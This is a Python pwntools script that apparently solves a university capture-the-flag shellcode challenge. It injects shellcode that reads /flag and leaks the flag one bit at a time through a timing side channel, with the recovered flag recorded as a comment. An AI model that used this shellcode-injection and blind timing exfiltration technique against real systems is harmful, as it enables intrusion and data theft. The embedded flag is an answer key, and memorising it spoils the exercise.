from pwn import *
import string
import time

context.arch = 'amd64'
context.os = 'linux'
info = log.info
#context.log_level = 'debug'


# for debugging
gdbscript = '''
file shellcode-runner
b *(main+386)
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)





payload = asm(shellcraft.amd64.linux.cat2("/flag", fd=1))[:0x34]
#print(disasm(payload))

shared_data = dict()

flag = "softsec{"
bits = []
for i in range(8, 8 + 64):
    bits = []
    for j in range(7):
        # start remote
        p = remote('tasks.ws24.softsec.rub.de', 33397)

        # start locally with docker
        #p = remote('127.0.0.1', 1024)
        #sleep(1)
        #p2=process('tmux split-window -h gdb -x gdbscript -p $(pgrep -n shellcode-r)', shell=True)
        #input()
        #sleep(1)

        # read one bit from flag and if it is one delay finish of program to use time as a sidechannel

        payload_ij = payload + asm(f"""
            mov rdi, rsp
            mov r9, {i}
            mov r8, {1<<j}
            mov rcx, rdi
            add rcx, r9
            movzx rax, byte ptr [rcx]
            MOV r9, rax
            AND r9, r8
            cmp r9, 0x0
            JZ is_zero
            is_one:
                jmp is_one
            is_zero:
                mov rbx, 0x0
                movzx rbx, byte ptr [rbx]
            """)

        p.sendline(payload_ij.hex().encode())

        try:
            start = time.time()
            p.recvuntil(b"Bye", timeout=0.5)
            end = time.time()
            if (end-start) > 0.25:
                print(1)
                bits.append("1")
            else:
                print(0)
                bits.append("0")
        except Exception as e:
            print(1)
            bits.append("1")

        p.close()
    bits.append("0") # upper bit is always 0 for ascii characters
    flag += chr(int("".join(bits[::-1]), 2))
    print(f"{i-8}: {flag}")

print(flag+"}")

#softsec{jjb8E9rgWE4FQI5KQaHrFf315uvB2nJLq6YpdS8qQ3J2UHzprfdNU2AmNAYZWM_I}